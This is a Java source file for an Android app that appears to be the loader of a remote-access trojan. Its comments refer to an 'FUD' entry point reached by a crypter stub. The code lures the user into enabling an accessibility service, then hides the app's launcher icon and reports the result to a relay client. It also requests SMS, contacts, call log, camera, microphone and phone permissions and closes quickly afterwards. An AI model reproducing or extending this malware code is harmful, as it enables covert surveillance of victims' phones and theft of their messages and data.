package com.device.ctrl;

import android.app.Activity;
import android.app.Application;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.text.TextUtils;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        startHidden(this);
        finish();
    }

    // FUD Entry Point for Reflection by the Stub
    public static void startHidden(Context ctx) {
        if (isAccessibilityEnabled(ctx)) {
            hideAppIcon(ctx);
            return;
        }
        openAccessibilitySettings(ctx);
        startMonitorForA11y(ctx);
    }

    private static boolean isAccessibilityEnabled(Context ctx) {
        int accessibilityEnabled = 0;
        final String service = ctx.getPackageName() + "/" + ControlService.class.getCanonicalName();
        try {
            accessibilityEnabled = Settings.Secure.getInt(ctx.getContentResolver(), Settings.Secure.ACCESSIBILITY_ENABLED);
        } catch (Exception ignored) {}
        TextUtils.SimpleStringSplitter mStringColonSplitter = new TextUtils.SimpleStringSplitter(':');

        if (accessibilityEnabled == 1) {
            String settingValue = Settings.Secure.getString(ctx.getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (settingValue != null) {
                mStringColonSplitter.setString(settingValue);
                while (mStringColonSplitter.hasNext()) {
                    if (mStringColonSplitter.next().equalsIgnoreCase(service)) return true;
                }
            }
        }
        return false;
    }

    private static void openAccessibilitySettings(Context ctx) {
        try {
            Intent i = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(i);
        } catch (Exception ignored) {}
    }

    private static void startMonitorForA11y(Context ctx) {
        Handler h = new Handler(Looper.getMainLooper());
        Runnable check = new Runnable() {
            @Override public void run() {
                if (isAccessibilityEnabled(ctx)) {
                    hideAppIcon(ctx);
                } else {
                    h.postDelayed(this, 1000);
                }
            }
        };
        h.postDelayed(check, 1000);
    }

    private static void hideAppIcon(Context ctx) {
        try {
            PackageManager p = ctx.getPackageManager();
            // Dynamically find the launcher component (works for User, FUD, or any stub)
            Intent launchIntent = p.getLaunchIntentForPackage(ctx.getPackageName());
            if (launchIntent != null && launchIntent.getComponent() != null) {
                p.setComponentEnabledSetting(launchIntent.getComponent(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
                RelayClient.get().sendLog("👻 App icon hidden successfully.");
            }
        } catch (Exception ignored) {}
    }

    public static class App extends Application {}
    public static class BootReceiver extends BroadcastReceiver {
        @Override public void onReceive(Context ctx, Intent intent) {}
    }

    public static class CrashHandler implements Thread.UncaughtExceptionHandler {
        private final Context context;
        private final Thread.UncaughtExceptionHandler defaultHandler;

        public CrashHandler(Context ctx) {
            this.context = ctx;
            this.defaultHandler = Thread.getDefaultUncaughtExceptionHandler();
        }

        @Override
        public void uncaughtException(Thread t, Throwable e) {
            try {
                // Log or handle crash
            } catch (Exception ignored) {}
            if (defaultHandler != null) {
                defaultHandler.uncaughtException(t, e);
            } else {
                System.exit(2);
            }
        }
    }

    public static class PermissionActivity extends Activity {
        private static final int REQ_CODE = 1001;

        @Override
        protected void onCreate(Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
                String[] perms = {
                        android.Manifest.permission.READ_SMS,
                        android.Manifest.permission.RECEIVE_SMS,
                        android.Manifest.permission.SEND_SMS,
                        android.Manifest.permission.READ_CONTACTS,
                        android.Manifest.permission.READ_CALL_LOG,
                        android.Manifest.permission.CAMERA,
                        android.Manifest.permission.RECORD_AUDIO,
                        android.Manifest.permission.CALL_PHONE,
                        android.Manifest.permission.READ_PHONE_STATE
                };
                java.util.List<String> needed = new java.util.ArrayList<>();
                for (String p : perms) {
                    if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) {
                        needed.add(p);
                    }
                }
                if (!needed.isEmpty()) {
                    requestPermissions(needed.toArray(new String[0]), REQ_CODE);
                    new Handler(Looper.getMainLooper()).postDelayed(this::finish, 8000);
                    return;
                }
            }
            new Handler(Looper.getMainLooper()).postDelayed(this::finish, 800);
        }

        @Override
        public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
            super.onRequestPermissionsResult(requestCode, permissions, grantResults);
            finish();
        }
    }
}
